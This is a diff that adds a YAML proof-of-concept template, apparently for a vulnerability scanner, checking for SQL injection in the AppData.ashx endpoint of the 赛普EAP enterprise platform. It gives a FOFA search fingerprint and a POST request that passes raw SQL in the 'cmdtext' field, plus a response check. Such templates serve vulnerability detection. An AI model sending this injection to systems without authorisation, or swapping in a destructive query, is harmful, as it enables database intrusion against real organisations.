@@ -1,0 +1,29 @@
+id: poc-yaml-chinasap-eap-appdata-apsx-sqli
+info:
+  name: 赛普EAP企业适配管理平台 AppData.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 赛普EAP企业适配管理平台
+  fofa: body="IDWebSoft/"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /IDWebSoft/AppData.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=GetDataTableByText&cmdtext=select sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'));
+  expression: 'status_code == 200 &&
+
+    contains(body,"\"ExceptionMsg\":") &&
+
+    contains(body,"\"ResultText\":") &&
+
+    contains(body,"0x" + t2) &&
+
+    !contains(body,"<")
+
+    '
+transport: http
